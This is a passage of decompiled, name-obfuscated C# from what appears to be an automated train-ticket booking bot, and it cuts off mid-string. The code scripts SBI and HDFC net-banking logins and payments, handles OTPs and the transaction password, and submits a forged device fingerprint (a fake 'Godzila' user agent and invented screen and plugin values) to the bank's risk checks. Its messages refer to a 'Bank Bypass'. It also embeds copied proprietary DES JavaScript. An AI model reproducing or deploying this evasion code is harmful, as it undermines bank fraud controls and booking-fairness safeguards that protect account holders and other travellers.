                                                sbiActive = false;
                                                return false;
                                            }
                                            text18 = frmOTP.string_0;
                                            frmOTP.Dispose();
                                        }
                                        text18 = EncryptAes(text18, frmMerchantPostt);
                                        text18 = HttpUtility.UrlEncode(text18);
                                        if (text18.Length >= 2)
                                        {
                                            string_92 = string_93;
                                            if (string_96.IndexOf(";jsessionid=") > 0)
                                            {
                                                text11 = string_96.Substring(string_96.IndexOf(";jsessionid="));
                                                text11 = text11.Substring(0, text11.IndexOf("\""));
                                            }
                                            text6 = class3_0.Method_SerialInp(string_96, ref string_94, bool_14: false);
                                            string_93 = "https://merchant.onlinesbi.sbi/merchant/smsenablehighsecurityconfirm.htm;" + text11;
                                            text6 = text6.Replace("&Button4=Confirm", "").Replace("&Reset=Reset", "");
                                            text6 = clsPostData.SetPost(text6, "securityPassword", text18);
                                            clsMain.Lock("Hit Fifith + High Security Hit Inp = " + text6);
                                            if (updateTStatus_1 != null)
                                            {
                                                updateTStatus_1.BeginInvoke(1, "Init. SBI_NB(5/6)", tCntrlName_, null, null);
                                            }
                                            if (!_Request(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
                                            {
                                                goto IL_105c;
                                            }
                                            clsMain.Lock("Hit Fifith + High Security Hit output = " + string_96);
                                            string_92 = string_93;
                                            if (string_96.Contains("you will be automatically redirected to the"))
                                            {
                                                goto IL_10ac;
                                            }
                                            if (string_96.Contains("High security transaction password"))
                                            {
                                                num2++;
                                                if (num2 >= 3)
                                                {
                                                    break;
                                                }
                                                if (num2 == 0)
                                                {
                                                    continue;
                                                }
                                                goto IL_1107;
                                            }
                                            if (num3 < 3)
                                            {
                                                goto end_IL_064f;
                                            }
                                            break;
                                        }
                                        clsMain.Lock("OTP Not Recived Cancelled by App.");
                                        string_91 = "SBI OTP Cancelled by User";
                                        sbiActive = false;
                                        return false;
                                    }
                                }
                                goto IL_1350;
                            }
                            string_91 = "You have exceeded the per day transaction maximum count";
                            clsMain.Lock("Third Hit Failed, Not valid HTML err = " + string_91);
                            sbiActive = false;
                            return false;
                        }
                        clsMain.Lock("Third Hit Failed. err = " + string_95);
                        string_91 = "Failed while making Payment. Payment Not Done";
                        sbiActive = false;
                        return false;
                    IL_105c:
                        string_91 = "Failed while making Payment. Payment Not Done";
                        if (num3 < 3)
                        {
                            goto IL_1147;
                        }
                        clsMain.Lock("Fifth + High Security Hit Failed. err = " + string_95);
                        sbiActive = false;
                        return false;
                    IL_1350:
                        if (string_96.Contains("you will be automatically redirected to the"))
                        {
                            if (string_96.Contains("Completed Successfully"))
                            {
                                if (string_96.IndexOf(";jsessionid=") > 0)
                                {
                                    text11 = string_96.Substring(string_96.IndexOf(";jsessionid="));
                                    text11 = text11.Substring(0, text11.IndexOf("'"));
                                }
                                text6 = class3_0.Method_SerialInp(string_96, ref string_94, bool_14: false);
                                clsMain.Lock("Sixth Hit Inp = " + text6);
                                string_93 = "https://merchant.onlinesbi.sbi/merchant/redirect.htm;" + text11;
                                if (updateTStatus_1 != null)
                                {
                                    updateTStatus_1.BeginInvoke(1, "Init. SBI_NB(6/6)", clsMain.tCntrlName_, null, null);
                                }
                                if (!_Request(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
                                {
                                    clsMain.Lock("Sixth Hit Failed. err = " + string_95);
                                    string_91 = "Failed while making Payment. Payment Not Done";
                                    sbiActive = false;
                                    return false;
                                }
                                clsMain.Lock("Sixth Hit Output = " + string_96);
                                if (string_96.Contains("document.redirectForm.submit"))
                                {
                                    string_90 = string_96;
                                    string_91 = string_93;
                                    sbiActive = false;
                                    return true;
                                }
                                string_91 = "Failed! Payment Done, Ticket Not Booked";
                                clsMain.Lock("Fifth Hit Failed, Not valid HTML err = " + string_91);
                                sbiActive = false;
                                return false;
                            }
                            if (string_96.Contains("Clear Balance Funds not available") | string_96.Contains("Insufficient funds"))
                            {
                                string_91 = "Clear Balance Funds not available into SBI, Ticket Not Booked";
                            }
                            else if (string_96.Contains("failure"))
                            {
                                string_91 = " Failure Transaction into SBI, Ticket Not Booked";
                                if (num3 < 2)
                                {
                                    break;
                                }
                            }
                            else if (num3 < 2)
                            {
                                break;
                            }
                        }
                        clsMain.Lock("Fourth Hit Failed, Not valid HTML err = " + string_91);
                        sbiActive = false;
                        return false;
                    IL_1147:
                        string_93 = "https://merchant.onlinesbi.sbi/merchant/merchantdisplay.htm";
                        text6 = "";
                        clsMain.Lock("Second-Second Hit Inp = " + text6);
                        if (_Request(string_93, text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
                        {
                            clsMain.Lock("Second-Second Hit Output = " + string_96);
                            string_92 = string_93;
                            continue;
                        }
                        clsMain.Lock("Second-Second Hit Failed. err = " + string_95);
                        string_91 = "Failed while making Payment. Payment Not Done";
                        sbiActive = false;
                        return false;
                    IL_1107:
                        if (num2 == 1 && text == "otpOffline")
                        {
                            goto IL_1147;
                        }
                        clsMain.Lock("After Fifth + High Security Hit Failed. err = Invaild Bank Bypass Detail");
                        string_91 = "Invaild Bank Bypass Detail. Please Again Bypass it";
                        sbiActive = false;
                        return false;
                    IL_10ac:
                        if (string_96.Contains("Sorry, unable to process your request. Please try later.") && num3 < 3)
                        {
                            goto IL_1147;
                        }
                        goto IL_1350;
                        continue;
                    end_IL_064f:
                        break;
                    }
                }
                catch
                {
                    sbiActive = false;
                    return false;
                }
            }
            string_91 = "0.Some Thing Went Wrong With SBI Payment";
            clsMain.Lock("0.Html Doesn't Contains Onlinesbi, Returning.");
            sbiActive = false;
            return false;
        }


        public static string EncryptAes(string plainText, string passphrase)
        {
            byte[] SaltHeader = new byte[] { 0x53, 0x61, 0x6c, 0x74, 0x65, 0x64, 0x5f, 0x5f };
            byte[] encrypted;
            Random rnd = new Random();
            var saltBytes = new byte[8];
            rnd.NextBytes(saltBytes);
            var passphraseBytes = Encoding.UTF8.GetBytes(passphrase);
            DeriveKeyAndIv(passphraseBytes, saltBytes, 1, out var keyBytes, out var ivBytes);
            using (var aes = Aes.Create())
            {
                aes.Key = keyBytes;
                aes.IV = ivBytes;
                aes.KeySize = 256;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                var encryptor = aes.CreateEncryptor(keyBytes, ivBytes);
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }
            encrypted = SaltHeader.Concat(saltBytes).Concat(encrypted).ToArray();
            return Convert.ToBase64String(encrypted.ToArray());
        }

        private static void DeriveKeyAndIv(byte[] passphrase, byte[] salt, int iterations, out byte[] key, out byte[] iv)
        {
            var hashList = new List<byte>();

            var preHashLength = passphrase.Length + (salt?.Length ?? 0);
            var preHash = new byte[preHashLength];

            Buffer.BlockCopy(passphrase, 0, preHash, 0, passphrase.Length);
            if (salt != null)
                Buffer.BlockCopy(salt, 0, preHash, passphrase.Length, salt.Length);

            var hash = MD5.Create();
            var currentHash = hash.ComputeHash(preHash);

            for (var i = 1; i < iterations; i++)
            {
                currentHash = hash.ComputeHash(currentHash);
            }

            hashList.AddRange(currentHash);

            while (hashList.Count < 48)
            {
                preHashLength = currentHash.Length + passphrase.Length + (salt?.Length ?? 0);
                preHash = new byte[preHashLength];

                Buffer.BlockCopy(currentHash, 0, preHash, 0, currentHash.Length);
                Buffer.BlockCopy(passphrase, 0, preHash, currentHash.Length, passphrase.Length);
                if (salt != null)
                    Buffer.BlockCopy(salt, 0, preHash, currentHash.Length + passphrase.Length, salt.Length);

                currentHash = hash.ComputeHash(preHash);

                for (var i = 1; i < iterations; i++)
                {
                    currentHash = hash.ComputeHash(currentHash);
                }

                hashList.AddRange(currentHash);
            }

            hash.Clear();
            key = new byte[32];
            iv = new byte[16];
            hashList.CopyTo(0, key, 0, 32);
            hashList.CopyTo(32, iv, 0, 16);
        }

        private bool HdfcPAYTM(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            int num = 90000;
            int num2 = 0;
            clsMain.Lock("Enter ProcessHDFCNetBanking.");
            if (string_86.Contains("hdfcbank"))
            {
                string_89 = "";
                string string_91 = "https://www.irctc.co.in/eticketing/jpInput.jsf?cid=1";
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[1];
                string value = "";
                if (array.Length > 2)
                {
                    value = array[2];
                }
                string string_92 = "";
                string string_93 = "";
                string string_94 = "";
                string text3 = "";
                string text4 = "";
                DateTime now = DateTime.Now;
                bool result2;
                try
                {
                    CookieContainer cookieContainer_;
                    string text5;
                    while (true)
                    {
                        if (!bool_13)
                        {
                            text5 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                        }
                        else
                        {
                            bool_13 = false;
                            string[] array2 = string_86.Split(new string[1] { "|" }, StringSplitOptions.None);
                            text5 = array2[0];
                            string_92 = array2[1];
                        }
                        cookieContainer_ = null;
                        num2++;
                        clsMain.Lock("First Hit : Inp = " + text5);
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(1/8)", tCntrlName_, null, null);
                        }
                        if (_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("First Output htm = " + string_94);
                            if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("HDFC Bank Direct Pay"))
                            {
                                int startIndex = string_94.IndexOf("var MerchantCode") + 5;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                int length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text6 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var EpiReqId", startIndex) + 5;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text7 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var ClientCode", startIndex) + 5;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text8 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var MerchantRefNo", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text9 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var TxnDateTime", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text10 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var OrgReqDate", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string str = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var TxnAmount", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text11 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var TxnScAmount", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text12 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var DynamicUrl", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string str2 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var CheckSum", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text13 = string_94.Substring(startIndex, length);
                                string str3 = "*" + text7 + "*" + text6 + "*" + text8 + "*" + text9 + "*" + text10 + "******";
                                text5 = "fldAppId=XT&fldTxnId=RGN&fldScrnSeqNbr=01&fldLangId=eng&fldDeviceId=01&fldWebServerId=YG&fldAppServerId=ZZ&fldRandomNumber=&fldRefPage=rsloginhtml&fldRefVal=" + text + "--MERCHANT-Y-&fldRsaAuthReq=Y&fldClientCode=" + text8 + "&fldMerchCode=" + text6 + "&fldClientAccNum=&fldAccReqFlag=N&fldMerchRefNbr=" + text9 + "&fldSucStatFlg=N&fldFailStatFlg=N&fldDatTimeTxn=" + HttpUtility.UrlEncode(text10) + "&fldTxnCurr=INR&fldTxnAmt=" + text11 + "&fldTxnScAmt=" + text12 + "&fldDevicePrint=&fldRef1=&fldRef2=&fldRef3=&fldRef4=&fldRef5=&fldRef6=&fldRef7=&fldRef8=&fldRef9=&fldRef10=&fldRef11=&fldDate1=&fldDate2=&fldCheckSum=&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldDisplayDetails=&fldDetails1=&fldDetails2=&fldDetails3=&fldEpiToken=" + HttpUtility.UrlEncode(str3) + "&fldEpiReqId=" + text7 + "&OrgReqDate=" + HttpUtility.UrlEncode(str) + "&fldLoginUserId=" + text;
                                string_91 = "https://netbanking.hdfcbank.com/netbanking/RSLogin.html?v=4";
                                string_92 = "https://netbanking.hdfcbank.com/netbanking/epientry";
                                clsMain.Lock("Second Hit : Inp = " + text5);
                                if (updateTStatus_1 != null)
                                {
                                    updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(2/8)", tCntrlName_, null, null);
                                }
                                if (_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_94, ref string_93, ref webException_0))
                                {
                                    clsMain.Lock("Second Hit Output = " + string_94);
                                    if (!string_94.Contains("fldPassword"))
                                    {
                                        if (string_94.Contains("errormessage='"))
                                        {
                                            startIndex = string_94.IndexOf("errormessage='");
                                            startIndex = string_94.IndexOf("'", startIndex) + 1;
                                            length = string_94.IndexOf("'", startIndex) - startIndex;
                                            string_90 = string_94.Substring(startIndex, length).Trim();
                                            if (string_90.Contains("16001"))
                                            {
                                                string_90 = "You are not registered for NetBanking.";
                                            }
                                            if (string_90.IndexOf("last session was terminated incorrectly", StringComparison.CurrentCultureIgnoreCase) >= 0 && num2 < 7)
                                            {
                                                continue;
                                            }
                                        }
                                        if (string.IsNullOrEmpty(string_90) && string_94.Contains("frmResetPassword"))
                                        {
                                            string_90 = "HDFC: Please Reset your Login Password";
                                        }
                                        if (string.IsNullOrEmpty(string_90))
                                        {
                                            string_90 = "Failed while Login into HDFC";
                                        }
                                        clsMain.Lock("Second Hit, Not valid HTML err = " + string_90);
                                        return false;
                                    }
                                    string str4 = "version=2&pm_fpua=Godzila/5.0 (windows nt 6.1) applewebkit/537.36 (khtml, like gecko) chrome/44.0.2403.157 safari/537.36|5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36|Win32&pm_fpsc=24|1600|900|856&pm_fpsw=&pm_fptz=5.5&pm_fpln=lang=en-US|syslang=|userlang=&pm_fpjv=1&pm_fpco=1&pm_fpasw=widevinecdmadapter|mhjfbmdgcfjbbpaeojofohoefgiehjai|pepflashplayer|internal-remoting-viewer|internal-nacl-plugin|internal-pdf-viewer&pm_fpan=Netscape&pm_fpacn=Mozilla&pm_fpol=true&pm_fposp=&pm_fpup=&pm_fpsaw=1600&pm_fpspd=24&pm_fpsbd=&pm_fpsdx=&pm_fpsdy=&pm_fpslx=&pm_fpsly=&pm_fpsfse=&pm_fpsui=";
                                    string string_95 = Math.Ceiling(10000000.0 + (double)new Random().Next(90000001)).ToString();
                                    string text14 = text2.ToUpper().Substring(2, text2.Length - 2);
                                    while (text14.Length < 32)
                                    {
                                        text14 += "0";
                                    }
                                    string text15 = method_5(text14, ref string_95);
                                    string text16 = "<html>\n<head>\n<script type=\"text/javascript\">\n\t/*-----------------------------------------------------------------------------\n\tThis source is part of the FLEXCUBE@ Java App Server Software System and is\n\tcopyrighted by i-flex Solutions Limited.\n\tAll rights reserved. No part of this work may be reproduced, stored in a\n\tretrieval system, adopted or transmitted in any form or by any means,\n\telectronic, mechanical, photographic, graphic, optic recording or otherwise,\n\ttranslated in any language or computer language, without the prior written\n\tpermission of i-flex Solutions Limited.\n\ti-flex Solutions Limited.\n\t10-11, SDF I, SEEPZ, Andheri (East),\n\tMumbai - 400 096.\n\tIndia\n\tCopyright 2004 i-flex Solutions Limited.\n\tModification History\n\tDate Version Author Description\n\t__________ ___________ _______________ ________________________________________\n\t22/11/2012 1.0 Sandeep Saxena Des algo\n\t------------------------------------------------------------------------------*/\n\t//des\n\t//this takes the key, the message, and whether to encrypt or decrypt\n\tfunction des (key, message, encrypt, mode, iv, padding) {\n\t//declaring this locally speeds things up a bit\n\tvar spfunction1 = new Array (0x1010400,0,0x10000,0x1010404,0x1010004,0x10404,0x4,0x10000,0x400,0x1010400,0x1010404,0x400,0x1000404,0x1010004,0x1000000,0x4,0x404,0x1000400,0x1000400,0x10400,0x10400,0x1010000,0x1010000,0x1000404,0x10004,0x1000004,0x1000004,0x10004,0,0x404,0x10404,0x1000000,0x10000,0x1010404,0x4,0x1010000,0x1010400,0x1000000,0x1000000,0x400,0x1010004,0x10000,0x10400,0x1000004,0x400,0x4,0x1000404,0x10404,0x1010404,0x10004,0x1010000,0x1000404,0x1000004,0x404,0x10404,0x1010400,0x404,0x1000400,0x1000400,0,0x10004,0x10400,0,0x1010004);\n\tvar spfunction2 = new Array (-0x7fef7fe0,-0x7fff8000,0x8000,0x108020,0x100000,0x20,-0x7fefffe0,-0x7fff7fe0,-0x7fffffe0,-0x7fef7fe0,-0x7fef8000,-0x80000000,-0x7fff8000,0x100000,0x20,-0x7fefffe0,0x108000,0x100020,-0x7fff7fe0,0,-0x80000000,0x8000,0x108020,-0x7ff00000,0x100020,-0x7fffffe0,0,0x108000,0x8020,-0x7fef8000,-0x7ff00000,0x8020,0,0x108020,-0x7fefffe0,0x100000,-0x7fff7fe0,-0x7ff00000,-0x7fef8000,0x8000,-0x7ff00000,-0x7fff8000,0x20,-0x7fef7fe0,0x108020,0x20,0x8000,-0x80000000,0x8020,-0x7fef8000,0x100000,-0x7fffffe0,0x100020,-0x7fff7fe0,-0x7fffffe0,0x100020,0x108000,0,-0x7fff8000,0x8020,-0x80000000,-0x7fefffe0,-0x7fef7fe0,0x108000);\n\tvar spfunction3 = new Array (0x208,0x8020200,0,0x8020008,0x8000200,0,0x20208,0x8000200,0x20008,0x8000008,0x8000008,0x20000,0x8020208,0x20008,0x8020000,0x208,0x8000000,0x8,0x8020200,0x200,0x20200,0x8020000,0x8020008,0x20208,0x8000208,0x20200,0x20000,0x8000208,0x8,0x8020208,0x200,0x8000000,0x8020200,0x8000000,0x20008,0x208,0x20000,0x8020200,0x8000200,0,0x200,0x20008,0x8020208,0x8000200,0x8000008,0x200,0,0x8020008,0x8000208,0x20000,0x8000000,0x8020208,0x8,0x20208,0x20200,0x8000008,0x8020000,0x8000208,0x208,0x8020000,0x20208,0x8,0x8020008,0x20200);\n\tvar spfunction4 = new Array (0x802001,0x2081,0x2081,0x80,0x802080,0x800081,0x800001,0x2001,0,0x802000,0x802000,0x802081,0x81,0,0x800080,0x800001,0x1,0x2000,0x800000,0x802001,0x80,0x800000,0x2001,0x2080,0x800081,0x1,0x2080,0x800080,0x2000,0x802080,0x802081,0x81,0x800080,0x800001,0x802000,0x802081,0x81,0,0,0x802000,0x2080,0x800080,0x800081,0x1,0x802001,0x2081,0x2081,0x80,0x802081,0x81,0x1,0x2000,0x800001,0x2001,0x802080,0x800081,0x2001,0x2080,0x800000,0x802001,0x80,0x800000,0x2000,0x802080);\n\tvar spfunction5 = new Array (0x100,0x2080100,0x2080000,0x42000100,0x80000,0x100,0x40000000,0x2080000,0x40080100,0x80000,0x2000100,0x40080100,0x42000100,0x42080000,0x80100,0x40000000,0x2000000,0x40080000,0x40080000,0,0x40000100,0x42080100,0x42080100,0x2000100,0x42080000,0x40000100,0,0x42000000,0x2080100,0x2000000,0x42000000,0x80100,0x80000,0x42000100,0x100,0x2000000,0x40000000,0x2080000,0x42000100,0x40080100,0x2000100,0x40000000,0x42080000,0x2080100,0x40080100,0x100,0x2000000,0x42080000,0x42080100,0x80100,0x42000000,0x42080100,0x2080000,0,0x40080000,0x42000000,0x80100,0x2000100,0x40000100,0x80000,0,0x40080000,0x2080100,0x40000100);\n\tvar spfunction6 = new Array (0x20000010,0x20400000,0x4000,0x20404010,0x20400000,0x10,0x20404010,0x400000,0x20004000,0x404010,0x400000,0x20000010,0x400010,0x20004000,0x20000000,0x4010,0,0x400010,0x20004010,0x4000,0x404000,0x20004010,0x10,0x20400010,0x20400010,0,0x404010,0x20404000,0x4010,0x404000,0x20404000,0x20000000,0x20004000,0x10,0x20400010,0x404000,0x20404010,0x400000,0x4010,0x20000010,0x400000,0x20004000,0x20000000,0x4010,0x20000010,0x20404010,0x404000,0x20400000,0x404010,0x20404000,0,0x20400010,0x10,0x4000,0x20400000,0x404010,0x4000,0x400010,0x20004010,0,0x20404000,0x20000000,0x400010,0x20004010);\n\tvar spfunction7 = new Array (0x200000,0x4200002,0x4000802,0,0x800,0x4000802,0x200802,0x4200800,0x4200802,0x200000,0,0x4000002,0x2,0x4000000,0x4200002,0x802,0x4000800,0x200802,0x200002,0x4000800,0x4000002,0x4200000,0x4200800,0x200002,0x4200000,0x800,0x802,0x4200802,0x200800,0x2,0x4000000,0x200800,0x4000000,0x200800,0x200000,0x4000802,0x4000802,0x4200002,0x4200002,0x2,0x200002,0x4000000,0x4000800,0x200000,0x4200800,0x802,0x200802,0x4200800,0x802,0x4000002,0x4200802,0x4200000,0x200800,0,0x2,0x4200802,0,0x200802,0x4200000,0x800,0x4000002,0x4000800,0x800,0x200002);\n\tvar spfunction8 = new Array (0x10001040,0x1000,0x40000,0x10041040,0x10000000,0x10001040,0x40,0x10000000,0x40040,0x10040000,0x10041040,0x41000,0x10041000,0x41040,0x1000,0x40,0x10040000,0x10000040,0x10001000,0x1040,0x41000,0x40040,0x10040040,0x10041000,0x1040,0,0,0x10040040,0x10000040,0x10001000,0x41040,0x40000,0x41040,0x40000,0x10041000,0x1000,0x40,0x10040040,0x1000,0x41040,0x10001000,0x40,0x10000040,0x10040000,0x10040040,0x10000000,0x40000,0x10001040,0,0x10041040,0x40040,0x10000040,0x10040000,0x10001000,0x10001040,0,0x10041040,0x41000,0x41000,0x1040,0x1040,0x40040,0x10000000,0x10041000);\n\t//create the 16 or 48 subkeys we will need\n\tvar keys = des_createKeys (key);\n\tvar m=0, i, j, temp, temp2, right1, right2, left, right, looping;\n\tvar cbcleft, cbcleft2, cbcright, cbcright2\n\tvar endloop, loopinc;\n\tvar len = message.length;\n\tvar chunk = 0;\n\t//set up the loops for single and triple des\n\tvar iterations = keys.length == 32 ? 3 : 9; //single or triple des\n\tif (iterations == 3) {looping = encrypt ? new Array (0, 32, 2) : new Array (30, -2, -2);}\n\telse {looping = encrypt ? new Array (0, 32, 2, 62, 30, -2, 64, 96, 2) : new Array (94, 62, -2, 32, 64, 2, 30, -2, -2);}\n\t//pad the message depending on the padding parameter\n\tif (padding == 2) message += \" \"; //pad the message with spaces\n\telse if (padding == 1) {temp = 8-(len%8); message += String.fromCharCode (temp,temp,temp,temp,temp,temp,temp,temp); if (temp==8) len+=8;} //PKCS7 padding\n\telse if (!padding) message += \"\\0\\0\\0\\0\\0\\0\\0\\0\"; //pad the message out with null bytes\n\t//store the result here\n\tresult = \"\";\n\ttempresult = \"\";\n\tif (mode == 1) { //CBC mode\n\tcbcleft = (iv.charCodeAt(m++) << 24) | (iv.charCodeAt(m++) << 16) | (iv.charCodeAt(m++) << 8) | iv.charCodeAt(m++);\n\tcbcright = (iv.charCodeAt(m++) << 24) | (iv.charCodeAt(m++) << 16) | (iv.charCodeAt(m++) << 8) | iv.charCodeAt(m++);\n\tm=0;\n\t}\n\t//loop through each 64 bit chunk of the message\n\twhile (m < len) {\n\tleft = (message.charCodeAt(m++) << 24) | (message.charCodeAt(m++) << 16) | (message.charCodeAt(m++) << 8) | message.charCodeAt(m++);\n\tright = (message.charCodeAt(m++) << 24) | (message.charCodeAt(m++) << 16) | (message.charCodeAt(m++) << 8) | message.charCodeAt(m++);\n\t//for Cipher Block Chaining mode, xor the message with the previous result\n\tif (mode == 1) {if (encrypt) {left ^= cbcleft; right ^= cbcright;} else {cbcleft2 = cbcleft; cbcright2 = cbcright; cbcleft = left; cbcright = right;}}\n\t//first each 64 but chunk of the message must be permuted according to IP\n\ttemp = ((left >>> 4) ^ right) & 0x0f0f0f0f; right ^= temp; left ^= (temp << 4);\n\ttemp = ((left >>> 16) ^ right) & 0x0000ffff; right ^= temp; left ^= (temp << 16);\n\ttemp = ((right >>> 2) ^ left) & 0x33333333; left ^= temp; right ^= (temp << 2);\n\ttemp = ((right >>> 8) ^ left) & 0x00ff00ff; left ^= temp; right ^= (temp << 8);\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\tleft = ((left << 1) | (left >>> 31));\n\tright = ((right << 1) | (right >>> 31));\n\t//do this either 1 or 3 times for each chunk of the message\n\tfor (j=0; j<iterations; j+=3) {\n\tendloop = looping[j+1];\n\tloopinc = looping[j+2];\n\t//now go through and perform the encryption or decryption\n\tfor (i=looping[j]; i!=endloop; i+=loopinc) { //for efficiency\n\tright1 = right ^ keys[i];\n\tright2 = ((right >>> 4) | (right << 28)) ^ keys[i+1];\n\t//the result is attained by passing these bytes through the S selection functions\n\ttemp = left;\n\tleft = right;\n\tright = temp ^ (spfunction2[(right1 >>> 24) & 0x3f] | spfunction4[(right1 >>> 16) & 0x3f]\n\t| spfunction6[(right1 >>> 8) & 0x3f] | spfunction8[right1 & 0x3f]\n\t| spfunction1[(right2 >>> 24) & 0x3f] | spfunction3[(right2 >>> 16) & 0x3f]\n\t| spfunction5[(right2 >>> 8) & 0x3f] | spfunction7[right2 & 0x3f]);\n\t}\n\ttemp = left; left = right; right = temp; //unreverse left and right\n\t} //for either 1 or 3 iterations\n\t//move then each one bit to the right\n\tleft = ((left >>> 1) | (left << 31));\n\tright = ((right >>> 1) | (right << 31));\n\t//now perform IP-1, which is IP in the opposite direction\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\ttemp = ((right >>> 8) ^ left) & 0x00ff00ff; left ^= temp; right ^= (temp << 8);\n\ttemp = ((right >>> 2) ^ left) & 0x33333333; left ^= temp; right ^= (temp << 2);\n\ttemp = ((left >>> 16) ^ right) & 0x0000ffff; right ^= temp; left ^= (temp << 16);\n\ttemp = ((left >>> 4) ^ right) & 0x0f0f0f0f; right ^= temp; left ^= (temp << 4);\n\t//for Cipher Block Chaining mode, xor the message with the previous result\n\tif (mode == 1) {if (encrypt) {cbcleft = left; cbcright = right;} else {left ^= cbcleft2; right ^= cbcright2;}}\n\ttempresult += String.fromCharCode ((left>>>24), ((left>>>16) & 0xff), ((left>>>8) & 0xff), (left & 0xff), (right>>>24), ((right>>>16) & 0xff), ((right>>>8) & 0xff), (right & 0xff));\n\tchunk += 8;\n\tif (chunk == 512) {result += tempresult; tempresult = \"\"; chunk = 0;}\n\t} //for every 8 characters, or 64 bits in the message\n\t//return the result as an array\n\treturn result + tempresult;\n\t} //end of des\n\t//des_createKeys\n\t//this takes as input a 64 bit key (even though only 56 bits are used)\n\t//as an array of 2 integers, and returns 16 48 bit keys\n\tfunction des_createKeys (key) {\n\t//declaring this locally speeds things up a bit\n\tpc2bytes0 = new Array (0,0x4,0x20000000,0x20000004,0x10000,0x10004,0x20010000,0x20010004,0x200,0x204,0x20000200,0x20000204,0x10200,0x10204,0x20010200,0x20010204);\n\tpc2bytes1 = new Array (0,0x1,0x100000,0x100001,0x4000000,0x4000001,0x4100000,0x4100001,0x100,0x101,0x100100,0x100101,0x4000100,0x4000101,0x4100100,0x4100101);\n\tpc2bytes2 = new Array (0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808,0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808);\n\tpc2bytes3 = new Array (0,0x200000,0x8000000,0x8200000,0x2000,0x202000,0x8002000,0x8202000,0x20000,0x220000,0x8020000,0x8220000,0x22000,0x222000,0x8022000,0x8222000);\n\tpc2bytes4 = new Array (0,0x40000,0x10,0x40010,0,0x40000,0x10,0x40010,0x1000,0x41000,0x1010,0x41010,0x1000,0x41000,0x1010,0x41010);\n\tpc2bytes5 = new Array (0,0x400,0x20,0x420,0,0x400,0x20,0x420,0x2000000,0x2000400,0x2000020,0x2000420,0x2000000,0x2000400,0x2000020,0x2000420);\n\tpc2bytes6 = new Array (0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002,0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002);\n\tpc2bytes7 = new Array (0,0x10000,0x800,0x10800,0x20000000,0x20010000,0x20000800,0x20010800,0x20000,0x30000,0x20800,0x30800,0x20020000,0x20030000,0x20020800,0x20030800);\n\tpc2bytes8 = new Array (0,0x40000,0,0x40000,0x2,0x40002,0x2,0x40002,0x2000000,0x2040000,0x2000000,0x2040000,0x2000002,0x2040002,0x2000002,0x2040002);\n\tpc2bytes9 = new Array 